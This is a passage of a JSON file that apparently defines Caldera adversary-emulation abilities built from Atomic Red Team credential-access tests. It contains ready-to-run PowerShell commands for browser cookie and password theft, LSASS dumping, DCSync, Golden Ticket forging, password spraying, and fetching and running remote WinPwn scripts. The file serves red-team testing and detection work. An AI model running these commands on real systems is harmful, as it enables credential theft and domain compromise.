                    "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue; \"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\" | out-file -filepath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "126aaf80c6a232eaf08dcef3163d4aed",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "126aaf80c6a232eaf08dcef3163d4aed"
    },
    "T1003__credential-access__OS Credential Dumping__2cc37a6cf2f1acdeaa6a6638016444d1": {
        "description": "AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2cc37a6cf2f1acdeaa6a6638016444d1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2cc37a6cf2f1acdeaa6a6638016444d1"
    },
    "T1552.005__credential-access__Unsecured Credentials: Cloud Instance Metadata API__d27398e945aa13a0812450cd48815572": {
        "description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.005",
            "name": "Unsecured Credentials: Cloud Instance Metadata API"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue",
                    "command": "import-module msonline; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-MsolService -Credential $Credential; $users = Get-MsolUser -All; foreach($user in $users); {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; foreach($prop in $props); {if($user.$prop -like \"*password*\"); {(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}; get-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d27398e945aa13a0812450cd48815572",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "d27398e945aa13a0812450cd48815572"
    },
    "T1552.001__credential-access__Unsecured Credentials: Credentials In Files__6d968b2bfa7f45550662620724618fb9": {
        "description": "Launches SessionGopher on this system via WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.001",
            "name": "Unsecured Credentials: Credentials In Files"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); sessionGopher -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6d968b2bfa7f45550662620724618fb9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6d968b2bfa7f45550662620724618fb9"
    },
    "T1110.004__credential-access__Brute Force: Credential Stuffing__3d7b7a1676afefc4af9506003b2d58d1": {
        "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.004",
            "name": "Brute Force: Credential Stuffing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"; .\\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3d7b7a1676afefc4af9506003b2d58d1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "3d7b7a1676afefc4af9506003b2d58d1"
    },
    "T1555__credential-access__Credentials from Password Stores__c7aa16aea441e7bec9a6391af601acc9": {
        "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); wificreds -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c7aa16aea441e7bec9a6391af601acc9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "c7aa16aea441e7bec9a6391af601acc9"
    },
    "T1003__credential-access__OS Credential Dumping__8de14c0ea1b80dbd5de0cf5d28cff16b": {
        "description": "This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.).\nReference: https://twitter.com/0gtweet/status/1415671356239216653",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "rundll32.exe keymgr,KRShowKeyMgr",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8de14c0ea1b80dbd5de0cf5d28cff16b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "8de14c0ea1b80dbd5de0cf5d28cff16b"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__1272c02ca685d9967ee2be885dea8df5": {
        "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysinternals\" -Force -Recurse -ErrorAction Ignore",
                    "command": "Set-Location -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysinternals\"; ./accesschk.exe -accepteula .; ",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1272c02ca685d9967ee2be885dea8df5",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1272c02ca685d9967ee2be885dea8df5"
    },
    "T1552.005__credential-access__Unsecured Credentials: Cloud Instance Metadata API__315440f0fd42ea0129065a76d89184f1": {
        "description": "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.005",
            "name": "Unsecured Credentials: Cloud Instance Metadata API"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1552.005Test2.txt -force -erroraction silentlycontinue",
                    "command": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > $env:temp\\T1552.005Test2.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "315440f0fd42ea0129065a76d89184f1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "315440f0fd42ea0129065a76d89184f1"
    },
    "T1552.004__credential-access__Unsecured Credentials: Private Keys__2d78dfbfea7fa4ec7349993b83048079": {
        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore; Remove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore",
                    "command": "Import-Module AADInternals -Force; Export-AADIntADFSCertificates; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2d78dfbfea7fa4ec7349993b83048079",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2d78dfbfea7fa4ec7349993b83048079"
    },
    "T1110.003__credential-access__Brute Force: Password Spraying__7532005da662bfc703ce3d8ef4e8ac70": {
        "description": "DomainPasswordSpray Attacks technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); domainpassspray -consoleoutput -noninteractive -emptypasswords",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7532005da662bfc703ce3d8ef4e8ac70",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7532005da662bfc703ce3d8ef4e8ac70"
    },
    "T1003.006__credential-access__OS Credential Dumping: DCSync__88d78618bbba0ca862d8d5a6f6fb4d72": {
        "description": "The following Atomic will run Get-ADReplAccount from DSInternals.\nUpon successful execution, domain and credentials will appear in stdout. \n[Reference](https://www.crowdstrike.com/blog/observations-from-the-stellarparticle-campaign/) CrowdStrike StellarParticle.\nhttps://www.dsinternals.com/en/retrieving-active-directory-passwords-remotely/\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.006",
            "name": "OS Credential Dumping: DCSync"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ADReplAccount -All -Server",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "88d78618bbba0ca862d8d5a6f6fb4d72",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "88d78618bbba0ca862d8d5a6f6fb4d72"
    },
    "T1555__credential-access__Credentials from Password Stores__935e8026584b85192519c57d7080b048": {
        "description": "This module will extract the credentials found within the Windows credential manager and dump\nthem to $env:TEMP\\windows-credentials.txt\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:TEMP\\windows-credentials.txt\" -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1555\\src\\T1555-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "935e8026584b85192519c57d7080b048",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "935e8026584b85192519c57d7080b048"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__abeb340acb3e1236c6919339942e7c77": {
        "description": "The following Atomic test utilizes WebBrowserPassView to extract passwords from browsers on a Window system. WebBrowserPassView is an open source application used to retrieve passwords stored on a local computer. Recently noticed as a tool used in the BlackCat Ransomware.",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Start-Process \"f3d204_WebBrowserPassView.exe\"; Start-Sleep -Second 4; Stop-Process -Name \"WebBrowserPassView\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "f3d204_WebBrowserPassView.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "abeb340acb3e1236c6919339942e7c77",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "abeb340acb3e1236c6919339942e7c77"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__aee64e494f7adfb1867d67f7ee08e5c6": {
        "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command \"all\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aee64e494f7adfb1867d67f7ee08e5c6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "aee64e494f7adfb1867d67f7ee08e5c6"
    },
    "T1003.003__credential-access__OS Credential Dumping: NTDS__6dc5c587fd22d65b81a443b7ce065ab1": {
        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "(gwmi -list win32_shadowcopy).Create('C:\\','ClientAccessible')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6dc5c587fd22d65b81a443b7ce065ab1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "6dc5c587fd22d65b81a443b7ce065ab1"
    },
    "T1552.004__credential-access__Unsecured Credentials: Private Keys__995eb25ee0b9d036110318311ca2527b": {
        "description": "Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try {;    $cert = Import-Certificate -FilePath $env:Temp\\AtomicRedTeam.cer -CertStoreLocation Cert:\\LocalMachine\\My -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore;    Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; }; catch { }",
                    "command": "$cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Export-Certificate -Type CERT -Cert  Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -FilePath $env:Temp\\AtomicRedTeam.cer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "995eb25ee0b9d036110318311ca2527b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "995eb25ee0b9d036110318311ca2527b"
    },
    "T1552.001__credential-access__Unsecured Credentials: Credentials In Files__aeb4fdbb3453127caaef0ad5c250d838": {
        "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.001",
            "name": "Unsecured Credentials: Credentials In Files"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "findstr /si pass *.xml *.doc *.txt *.xls; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aeb4fdbb3453127caaef0ad5c250d838",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "aeb4fdbb3453127caaef0ad5c250d838"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__fff25debffb3645d82c89632750497a1": {
        "description": "Simulates an adversary accessing encrypted credentials from Google Chrome Login database. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data\" -Force -ErrorAction Ignore; Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Login Data For Account\" -Force -ErrorAction Ignore",
                    "command": "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"; Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fff25debffb3645d82c89632750497a1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "fff25debffb3645d82c89632750497a1"
    },
    "T1558.001__credential-access__Steal or Forge Kerberos Tickets: Golden Ticket__107a14acdd84a7d6e7c891177b0db3aa": {
        "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.001",
            "name": "Steal or Forge Kerberos Tickets: Golden Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; cmd.exe /c \"$Env:temp\\rubeus.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden; $filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   cd %temp%;   \"$Env:temp\\rubeus.exe\" ptt /ticket:kirbifile;   echo.;   echo Requesting SYSVOL:;   dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "107a14acdd84a7d6e7c891177b0db3aa",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "107a14acdd84a7d6e7c891177b0db3aa"
    },
    "T1558.003__credential-access__Steal or Forge Kerberos Tickets: Kerberoasting__91a18ae1efe4119a549cea2ac7de72c4": {
        "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.003",
            "name": "Steal or Forge Kerberos Tickets: Kerberoasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Add-Type -AssemblyName System.IdentityModel; $ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "91a18ae1efe4119a549cea2ac7de72c4",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "91a18ae1efe4119a549cea2ac7de72c4"
    },
    "T1552.001__credential-access__Unsecured Credentials: Credentials In Files__ac7757ba58f423fa808b4b6f115cc613": {
        "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.001",
            "name": "Unsecured Credentials: Credentials In Files"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); SharpCloud -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ac7757ba58f423fa808b4b6f115cc613",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "ac7757ba58f423fa808b4b6f115cc613"
    },
    "T1110.003__credential-access__Brute Force: Password Spraying__baf7e695c46eda5497fc648d976054a6": {
        "description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "",
                    "command": "Import-Module -Name AzureAD; $PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword; Connect-AzureAD -Credential $Credential > $null; ($Users = Get-AzureADUser -All $true) > $null; Disconnect-AzureAD > $null; $PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force; $Users | Foreach-Object {;   $user = $_.UserPrincipalName;   $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword;   try {;     Write-Host \" [-] Attempting P@ssw0rd! on account ${user}.\";     Connect-AzureAD -Credential $Credential 2>&1> $null;     Write-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\";     Disconnect-AzureAD > $null;   } catch {;     Write-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\";   }; }; Write-Host \"End of password spraying\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "baf7e695c46eda5497fc648d976054a6",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "baf7e695c46eda5497fc648d976054a6"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__60bb6f8468aa98b75be2521861a164d5": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null; try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}; catch{ $_; exit $_.Exception.Response.StatusCode.Value__}; get-process lsass | Out-Minidump",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
